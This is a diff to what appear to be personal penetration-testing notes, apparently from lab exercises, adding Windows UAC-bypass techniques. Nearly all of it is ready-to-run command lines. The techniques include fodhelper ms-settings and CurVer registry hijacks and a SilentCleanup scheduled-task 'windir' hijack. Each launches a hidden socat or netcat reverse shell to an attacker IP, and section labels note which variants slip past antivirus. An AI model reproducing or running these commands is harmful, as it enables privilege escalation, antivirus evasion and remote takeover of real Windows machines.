@@ -294,6 +294,88 @@ run fodhelper.exe
 
 reg delete HKCU\Software\Classes\ms-settings\ /f
 
+
+
+Windows AV detected
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
+
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+
+reg add %REG_KEY% /d %CMD% /f 
+
+fodhelper.exe  
+
+==================================================================================================================
+Windows AV detected v2 but still can run (RACE CONDITION)
+
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+
+set CMD="powershell -windowstyle hidden C:\Users\kostas\Desktop\nc.exe 10.10.14.14:4747 -e cmd.exe,pipes"
+
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+
+(because these 2 run together)
+reg add %REG_KEY% /d %CMD% /f & fodhelper.exe  
+====================================================================================================================
+powershell detected AV
+
+$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.8.17.213:4445 EXEC:cmd.exe,pipes"
+
+New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+
+Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
+
+New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+
+Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
+
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+======================================================================================================================
+Translated powershell to cmd undetected BY AV
+
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:192.168.146.141:4556 EXEC:cmd.exe,pipes"
+
+set CMD="powershell -windowstyle hidden C:\Users\ASUS\Downloads\nc64.exe TCP:192.168.146.141:4556 EXEC:cmd.exe,pipes"
+
+reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+
+reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+
+==============================================================
+
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
+
+reg add "HKCU\Software\Classes\.jack\Shell\Open\command" /d %CMD% /f
+
+reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".jack" /f
+
+
+reg delete "HKCU\Software\Classes\.thm\" /f
+reg delete "HKCU\Software\Classes\ms-settings\" /f
+
+
+==========================================
+
+BYPASSING ALWAYS NOTIFIY
+-Schedule Task will not prompt user
+
+
+"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "
+
+reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.8.17.213:4446 EXEC:cmd.exe,pipes &REM " /f
+
+reg delete "HKCU\Environment" /v "windir" /f
+
+
+reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.8.17.213:4446 EXEC:cmd.exe,pipes &REM " /f
+schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+reg delete "HKCU\Environment" /v "windir" /f
+
+
+
 ```
 
 # Read Permissions
